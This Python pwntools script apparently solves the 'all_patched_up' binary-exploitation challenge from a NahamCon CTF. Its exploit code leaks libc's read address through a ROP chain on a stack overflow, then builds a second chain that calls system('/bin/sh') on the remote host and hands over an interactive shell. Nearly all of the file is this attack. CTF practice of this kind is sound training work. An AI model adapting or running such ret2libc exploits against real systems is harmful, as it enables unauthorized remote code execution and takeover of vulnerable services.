#!/usr/bin/env python3

from pwn import *

offset=520

# Local or remote
#p = process('./all_patched_up')
#p = remote("127.0.0.1", 9999)
p = remote("challenge.nahamcon.com", 30331)

# ELF is compile with No PIE
ret    = 0x000000000040101a

# Choose correct libc (system or CTF one)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.31.so")

# Gets some of the libc offset and ROP gadgets
system_offset = libc.sym['system'] 
read_offset = libc.sym['read'] 
binsh_offset = next(libc.search(b'/bin/sh'))  # grab string location
rop = ROP(libc)
pop_rdi_offset = (rop.find_gadget(['pop rdi', 'ret']))[0]

log.info("pop rdi offset : %s " % hex(pop_rdi_offset))
log.info("/bin/sh offset : %s " % hex(binsh_offset))
log.info("system  offset : %s " % hex(system_offset))
log.info("ret (no PIE)   : %s " % hex(ret))


# stage 1 Leaking read address using the ELF compiled with no PIE
# Since the code is "NO PIE" we can use the address in the main() 

write = 0x401060
read = 0x401080
read_got = 0x404028
main = 0x4011a9
pop_rsi = 0x401251 # #0x00401251 : (b'5e415f48c7c701000000c3')        pop rsi; pop r15; mov rdi,0x1; ret

print (p.recvuntil("> "))

# ROP to leak read address. The first ret call is optional (Ubuntu base distro needs stack alignment) 
payload = b'A'*offset
payload += p64(ret)
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(read_got)
payload += p64(write)
payload += p64(main)

p.sendline(payload)

# collects output and leaked address of read
output = p.recv(8)
log.info('{}'.format(output)) # The leaked value is printed.
leak = u64(output.strip(b"\n").ljust(8, b"\x00")) 
log.info('read@libc is at: {}'.format(hex(leak))) # The leaked value is printed.

libc_base = leak - read_offset

log.info('libc base address is at: {}'.format(hex(libc_base))) # The leaked value is printed.


# Stage 2 - exploit 

print (p.recvuntil("> "))
payload = b'A'*offset
payload += p64(libc_base+pop_rdi_offset)
payload += p64(libc_base+binsh_offset)
payload += p64(ret)
payload += p64(libc_base+system_offset)

# Send final payload and receive the shell
p.sendline(payload)
p.interactive()
